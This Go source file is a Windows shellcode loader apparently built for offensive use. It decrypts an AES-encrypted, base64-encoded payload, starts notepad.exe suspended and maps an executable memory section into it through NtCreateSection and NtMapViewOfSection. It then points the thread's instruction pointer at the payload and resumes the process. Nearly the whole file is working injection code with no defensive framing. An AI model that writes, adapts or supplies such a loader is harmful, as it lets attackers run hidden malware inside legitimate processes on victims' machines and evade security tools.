package early_injection

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Define necessary constants and structs manually
const (
	SECTION_ALL_ACCESS     = 0xF001F
	SEC_COMMIT             = 0x08000000
	PAGE_EXECUTE_READWRITE = 0x40
	CONTEXT_FULL           = 0x10007
	INFINITE               = 0xFFFFFFFF
)

type Context struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FloatSave            [512]byte
	VectorRegister       [26]uint64
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// Declare thread context functions
var (
	ntdll              = windows.NewLazySystemDLL("ntdll.dll")
	ntCreateSection    = ntdll.NewProc("NtCreateSection")
	ntMapViewOfSection = ntdll.NewProc("NtMapViewOfSection")
	ntResumeThread     = ntdll.NewProc("NtResumeThread")

	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetThreadContext = kernel32.NewProc("GetThreadContext")
	procSetThreadContext = kernel32.NewProc("SetThreadContext")
	virtualProtect       = kernel32.NewProc("VirtualProtect")
	waitForSingleObject  = kernel32.NewProc("WaitForSingleObject")
)

func EarlyInjection(Shellcode string, password string) {

	ciphertext, _ := base64.StdEncoding.DecodeString(Shellcode)
	key, _ := base64.StdEncoding.DecodeString(password)
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	// Step 1: Create the suspended process
	targetProcess := "C:\\Windows\\System32\\notepad.exe"
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)
	si.Cb = uint32(unsafe.Sizeof(*si))

	fmt.Printf("[*] Creating suspended process: %s\n", targetProcess)

	err := windows.CreateProcess(nil, windows.StringToUTF16Ptr(targetProcess), nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if err != nil {
		fmt.Printf("[!] Failed to create process. Error: %s\n", err)
		return
	}
	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	fmt.Printf("[*] Process created successfully with PID: %d\n", pi.ProcessId)

	// Step 2: Get NT syscall functions (loaded at startup via ntdll)
	if ntCreateSection.Find() != nil || ntMapViewOfSection.Find() != nil || ntResumeThread.Find() != nil {
		fmt.Println("[!] Failed to find NT functions in ntdll.dll")
		return
	}
	fmt.Println("[*] NT functions loaded successfully.")

	// Step 3: Create section for payload injection
	var sectionHandle windows.Handle
	sectionSize := int64(4096)
	maxSize := int64(sectionSize)

	fmt.Println("[*] Creating section for payload injection...")
	status, _, err := ntCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		0,
	)
	if status != 0 {
		fmt.Printf("[!] Failed to create section. NtCreateSection returned: %d\n", status)
		windows.TerminateProcess(pi.Process, 0)
		return
	}
	defer windows.CloseHandle(sectionHandle)
	fmt.Println("[*] Section created successfully.")

	// Step 4: Map section into current process
	var localSectionAddress uintptr
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		fmt.Printf("[!] Failed to get current process. Error: %s\n", err)
		return
	}
	fmt.Println("[*] Mapping section into current process...")
	status, _, err = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(currentProcess),
		uintptr(unsafe.Pointer(&localSectionAddress)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&sectionSize)),
		2, 0, PAGE_EXECUTE_READWRITE,
	)
	if status != 0 {
		fmt.Printf("[!] Failed to map section into current process. NtMapViewOfSection returned: %d\n", status)
		windows.TerminateProcess(pi.Process, 0)
		return
	}
	fmt.Printf("[*] Section mapped in current process at address: 0x%x\n", localSectionAddress)

	// Step 4b: Map section into target process
	var remoteSectionAddress uintptr
	fmt.Println("[*] Mapping section into target process...")
	status, _, err = ntMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&remoteSectionAddress)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&sectionSize)),
		2, 0, PAGE_EXECUTE_READWRITE,
	)
	if status != 0 {
		fmt.Printf("[!] Failed to map section into target process. NtMapViewOfSection returned: %d\n", status)
		windows.TerminateProcess(pi.Process, 0)
		return
	}
	fmt.Printf("[*] Section mapped in target process at address: 0x%x\n", remoteSectionAddress)

	// Step 5: Ensure the memory region is writable
	var oldProtect uint32
	fmt.Println("[*] Changing memory protection to PAGE_EXECUTE_READWRITE...")
	_, _, err = virtualProtect.Call(localSectionAddress, uintptr(sectionSize), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if err != syscall.Errno(0) {
		fmt.Printf("[!] Failed to change memory protection. VirtualProtect returned: %s\n", err)
		windows.TerminateProcess(pi.Process, 0)
		return
	}
	fmt.Println("[*] Memory protection changed successfully.")

	// Step 6: Copy payload into section
	copy((*[4096]byte)(unsafe.Pointer(localSectionAddress))[:], plaintext)
	fmt.Println("[*] Payload written to local section.")

	// Step 7: Adjust thread context
	var context Context
	context.ContextFlags = CONTEXT_FULL
	fmt.Println("[*] Retrieving thread context...")
	if err := getThreadContext(pi.Thread, &context); err != nil {
		fmt.Printf("[!] Failed to get thread context. Error: %s\n", err)
		windows.TerminateProcess(pi.Process, 0)
		return
	}

	// Print the full thread context before modifying
	//printThreadContext(&context)

	fmt.Printf("[*] Original RIP: 0x%x\n", context.Rip)
	context.Rip = uint64(remoteSectionAddress)

	fmt.Printf("[*] Setting RIP to shellcode address: 0x%x\n", remoteSectionAddress)
	if err := setThreadContext(pi.Thread, &context); err != nil {
		fmt.Printf("[!] Failed to set thread context. Error: %s\n", err)
		windows.TerminateProcess(pi.Process, 0)
		return
	}
	fmt.Println("[*] Thread context updated.")

	// Step 8: Resume the thread
	fmt.Println("[*] Resuming target process thread...")
	status, _, err = ntResumeThread.Call(uintptr(pi.Thread), 0)
	if status != 0 {
		fmt.Printf("[!] Failed to resume the target process. NtResumeThread returned: %d\n", status)
		windows.TerminateProcess(pi.Process, 0)
		return
	}

	// Wait for the thread to execute and check if it terminates
	fmt.Println("[*] Waiting for the thread to execute...")
	waitStatus, _, err := waitForSingleObject.Call(uintptr(pi.Thread), INFINITE)
	if waitStatus != 0 {
		fmt.Printf("[!] Thread wait failed. Error: %s\n", err)
		return
	}

	fmt.Println("[*] Target process resumed. Injection complete.")
}

// getThreadContext wraps the Windows API GetThreadContext
func getThreadContext(thread windows.Handle, context *Context) error {
	ret, _, err := procGetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// setThreadContext wraps the Windows API SetThreadContext
func setThreadContext(thread windows.Handle, context *Context) error {
	ret, _, err := procSetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(context)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

// printThreadContext prints the thread context for debugging purposes
func printThreadContext(context *Context) {
	fmt.Printf("Thread Context:\n")
	fmt.Printf("RIP: 0x%x\n", context.Rip)
	fmt.Printf("RSP: 0x%x\n", context.Rsp)
	fmt.Printf("RBP: 0x%x\n", context.Rbp)
	fmt.Printf("RAX: 0x%x\n", context.Rax)
	fmt.Printf("RBX: 0x%x\n", context.Rbx)
	fmt.Printf("RCX: 0x%x\n", context.Rcx)
	fmt.Printf("RDX: 0x%x\n", context.Rdx)
	fmt.Printf("RDI: 0x%x\n", context.Rdi)
	fmt.Printf("RSI: 0x%x\n", context.Rsi)
	fmt.Printf("R8: 0x%x\n", context.R8)
	fmt.Printf("R9: 0x%x\n", context.R9)
	fmt.Printf("R10: 0x%x\n", context.R10)
	fmt.Printf("R11: 0x%x\n", context.R11)
	fmt.Printf("R12: 0x%x\n", context.R12)
	fmt.Printf("R13: 0x%x\n", context.R13)
	fmt.Printf("R14: 0x%x\n", context.R14)
	fmt.Printf("R15: 0x%x\n", context.R15)
	fmt.Printf("EFlags: 0x%x\n", context.EFlags)
}
